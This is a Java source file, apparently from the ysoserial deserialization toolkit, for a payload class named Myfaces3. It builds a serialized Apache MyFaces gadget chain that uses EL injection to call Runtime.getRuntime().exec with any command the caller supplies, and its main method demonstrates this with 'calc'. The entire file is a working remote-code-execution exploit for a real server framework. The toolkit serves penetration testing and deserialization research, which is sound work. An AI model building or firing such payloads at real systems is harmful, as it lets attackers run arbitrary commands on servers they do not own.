package ysoserial.payloads;


import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.DefaultFunctionMapper;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.el.BeanELResolver;
import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.faces.context.FacesContext;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;


/*
Adding this for sentimental value as this is almost the same as the first deserialization exploit I ever crafted that
led to the larger research project.
 */
@Authors({ Authors.MBECHLER, Authors.FROHOFF })
@PayloadTest(harness = "ysoserial.test.payloads.MyFacesExecTest")
public class Myfaces3 implements ObjectPayload<Object>, DynamicDependencies {

    public Object getObject ( String command ) throws Exception {
        return makeExpressionPayload(command);
    }


    public static String[] getDependencies () {
        if ( System.getProperty("el") == null || "apache".equals(System.getProperty("el")) ) {
            return new String[] {
                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                "org.mortbay.jasper:apache-el:8.0.27",
                "javax.servlet:javax.servlet-api:3.1.0",

                // deps for mocking the FacesContext
                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            };
        } else if ( "juel".equals(System.getProperty("el")) ) {
            return new String[] {
                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
                "javax.servlet:javax.servlet-api:3.1.0",

                // deps for mocking the FacesContext
                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            };
        }

        throw new IllegalArgumentException("Invalid el type " + System.getProperty("el"));
    }

    public static Object makeExpressionPayload ( String expr ) throws IllegalArgumentException, IllegalAccessException, Exception  {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);

        DefaultFunctionMapper fm = new DefaultFunctionMapper();
        fm.addFunction("pwn","getRuntime", Runtime.class.getMethod("getRuntime", new Class[0]));

        CompositeELResolver elResolver = new CompositeELResolver();
        elResolver.add(new BeanELResolver());
        FacesELContext elContext = new FacesELContext(elResolver, fc);
        elContext.setFunctionMapper(fm);

        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression ve1 = expressionFactory.createValueExpression(elContext,
            "#{pwn:getRuntime().exec(\"" + Gadgets.escapeForJavaString(expr) + "\")}", Object.class);
        ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
        ValueExpressionMethodExpression e2 = new ValueExpressionMethodExpression(ve2);

        Reflections.setFieldValue(e.getWrapped(), "fnMapper", fm);

        return Gadgets.makeMap(e2, e);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Myfaces3.class, new String[] { "calc" });
    }
}
